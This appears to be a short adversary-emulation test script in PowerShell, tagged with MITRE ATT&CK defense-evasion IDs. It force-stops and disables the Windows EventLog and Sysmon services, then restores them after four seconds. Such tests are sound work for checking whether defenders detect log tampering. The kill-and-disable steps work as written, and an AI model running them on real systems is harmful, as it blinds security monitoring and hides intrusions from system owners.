<#
    T1562.001 - Impair Defenses: Disable or Modify Tools
    T1562.002 - Impair Defenses: Disable Windows Event Logging
    T1562.003 - Impair Defenses: Impair Command History Logging
    Simple script to kill Windows Event Log services and Sysmon Services
#>

$services = @('EventLog','Sysmon64','Sysmon')
foreach($svc in $services){
    $Service = Get-WmiObject -Class win32_service -Filter "Name = `'$svc`'"
    if($Service){
        # Stop Services
        Stop-Process -Id $Service.ProcessId -Force -PassThru -ErrorAction Stop
        Set-Service -Name $service.Name -StartupType Disabled
        sleep 4
        
        # Undo Actions
        Set-Service -Name $service.Name -StartupType Automatic
        Start-Service -Name $service.Name
        Get-Service $Service.Name
    }
}
